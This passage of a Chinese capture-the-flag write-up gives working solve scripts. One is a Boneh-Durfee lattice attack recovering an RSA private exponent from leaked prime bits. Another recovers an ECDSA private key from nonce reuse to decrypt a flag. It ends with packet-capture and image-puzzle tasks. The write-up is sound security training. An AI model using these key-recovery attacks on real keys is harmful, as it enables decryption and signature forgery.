class="number">0</span></span><br><span class="line">             <span class="comment"># 让我们检查它是否影响其他向量</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># 如果另一个向量受到影响：</span></span><br><span class="line">                <span class="comment"># 我们增加计数</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 等级：0</span></span><br><span class="line">            <span class="comment"># 如果没有其他载体最终受到影响</span></span><br><span class="line">            <span class="comment"># 我们删除它</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># 等级：1</span></span><br><span class="line">            <span class="comment">#如果只有一个受到影响，我们会检查</span></span><br><span class="line">            <span class="comment"># 如果它正在影响别的向量</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># 如果它影响哪怕一个向量</span></span><br><span class="line">                    <span class="comment"># 我们放弃这个</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># 如果没有其他向量受到影响，则将其删除，并且</span></span><br><span class="line">                <span class="comment"># 这个有用的向量不够有用</span></span><br><span class="line">                <span class="comment">#与我们无用的相比</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1，-1 如果 &quot;strict=true&quot;，并且行列式不受约束</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 在以下情况下找到解决方案：</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#多项式环</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-移位</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 x 移位列表</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#对于多项式中的单项式。单项式（）：</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># 如果单项不在单项中</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-移位</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 y 移位列表</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 构造格 B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#约化格的原型</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #自动删除</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 重置维度</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查向量是否有帮助</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查行列式是否正确界定</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;在格中寻找线性无关向量&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 对于i and j, 构造两个多项式</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 结果</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># 随机生成数据</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = <span class="number">69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class="line">        e = <span class="number">28439197921283357831697812537770489393495780585893113255835906777860388696994349687910509232020125501124985537099309478678733953591875352794038209770419925216539701941346792691704315717440469781000758533118851176304883130375842134875219545766782891367082825940026559693057872966937790726617783138946733512771</span></span><br><span class="line">        c = <span class="number">22634701644450101524194718626550730546669791908217195025458791096208664618277869132516992188391372685210476489439282043033169958992171845152117468239445520601245104073454741171223045094363461153069787573765111331214431209598625611554915848071794889073522221012875111880946316417640573688399584093700714982302</span></span><br><span class="line">        hint1 = <span class="number">654543761191063613807</span>  <span class="comment"># p高位</span></span><br><span class="line">        hint2 = <span class="number">819778612327847774041</span>  <span class="comment"># q高位</span></span><br><span class="line"><span class="comment">#         print (&quot;p真实高&quot;,s,&quot;比特：&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;q真实高&quot;,s,&quot;比特：&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 解密指数d的指数( 最大0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># 格大小（越大越好/越慢）</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># 来自 Herrmann 和 May 的优化</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># 如果 p、 q 大小相同，则正确</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#构建的方程</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== 核对数据 ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # e的bit数</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;p的高比特为：&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;q的高比特为：&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180807684-1768989984.png" alt="image-20241030180802109"></p><p>跑第二个脚本，得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180811902-786743954.png" alt="image-20241030180806277"></p><p>wdflag{31998a91-fd51-4df2-864e-73c122786868}</p><h2 id="CRYPTO02-1"><a href="#CRYPTO02-1" class="headerlink" title="CRYPTO02"></a>CRYPTO02</h2><p>下载附件，打开代码，问豆包</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180817943-2031923977.png" alt="image-20241030180812378"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先，根据椭圆曲线签名的性质，利用给定的r1, s1, z1, r2, s2, z2恢复dA</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的参数</span></span><br><span class="line">r1 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">r2 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">s1 = <span class="number">73636354334739290806716081380360143742414582638332132893041295586890856253300</span></span><br><span class="line">s2 = <span class="number">64320109990895398581134015047131652648423777800538748939578192006599226954034</span></span><br><span class="line">z1 = <span class="number">35311306706233977395060423051262119784421232920823462737043282589337379493964</span></span><br><span class="line">z2 = <span class="number">101807556569342254666094290602497540565936025601030395061064067677254735341454</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据椭圆曲线签名的恢复公式</span></span><br><span class="line"><span class="comment"># s1 * k - z1 = r1 * dA (mod n)</span></span><br><span class="line"><span class="comment"># s2 * k - z2 = r2 * dA (mod n)</span></span><br><span class="line"><span class="comment"># 由于r1 = r2，可以通过联立方程求解dA</span></span><br><span class="line">k = gmpy2.invert(s1 - s2, n) * (z1 - z2) % n</span><br><span class="line">dA = gmpy2.invert(r1, n) * (s1 * k - z1) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用恢复的dA生成AES密钥</span></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的加密后的flag十六进制字符串</span></span><br><span class="line">encrypted_flag_hex = <span class="string">&#x27;3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd64136875004b638b77191fe9bef702cb873ee93dbe376c050d0c721b69f17f539cff83372cc37b&#x27;</span></span><br><span class="line">encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取IV和密文</span></span><br><span class="line">iv = encrypted_flag_bytes[:AES.block_size]</span><br><span class="line">ciphertext = encrypted_flag_bytes[AES.block_size:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建AES解密对象</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="comment"># 去除填充</span></span><br><span class="line">plaintext = unpad(decrypted_data, AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对替换加密的逆过程（victory_encrypt的逆）</span></span><br><span class="line">victory_key = <span class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">key_length = <span class="built_in">len</span>(victory_key)</span><br><span class="line">decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext.decode().upper()):</span><br><span class="line">    <span class="keyword">if</span> char.isalpha():</span><br><span class="line">        shift = <span class="built_in">ord</span>(victory_key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift + <span class="number">26</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        decrypted_text += decrypted_char</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decrypted_text += char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure><p>运行后成功获取到flag，要转小写</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180832848-1086515924.png" alt="image-20241030180826831"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180840444-116028875.png" alt="image-20241030180834674"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="MISC01"><a href="#MISC01" class="headerlink" title="MISC01"></a>MISC01</h2><p>下载附件看题目描述</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180845157-545941591.png" alt="image-20241030180839581"></p><p>拿wireshark看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180857245-111451848.png" alt="image-20241030180851376"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180902131-690201118.png" alt="image-20241030180856447"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180906714-779293795.png" alt="image-20241030180900987"></p><p><strong>md5加密</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180910546-2006475635.png" alt="image-20241030180905063"></p><p>最后得到flag</p><p>wdflag{bd9bfee6c7303048dab68cfa6a14b5e7}</p><h2 id="MISC03"><a href="#MISC03" class="headerlink" title="MISC03"></a>MISC03</h2><p>找攻击IP</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180915751-1519011757.png" alt="image-20241030180909859"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180923878-1406315282.png" alt="image-20241030180917812"></p><p>攻击IP为：39.168.5.60</p><h2 id="MISC04"><a href="#MISC04" class="headerlink" title="MISC04"></a>MISC04</h2><p>给了一个这个抽象图片，蓝底红线，凭直觉一个是需要还原成二维码的形式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180936378-958370206.png" alt="image-20241030180930356"></p><p>根据题干，他是有一个图像加密算法，需要把这个红线还原重组成二维码，搜索一个是这个Peano曲线</p><p>最终找到了一个irisctf的一道赛题The Peano Scramble</p><p><a href="https://almostgph.github.io/2024/01/08/IrisCTF2024/">https://almostgph.github.io/2024/01/08/IrisCTF2024/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 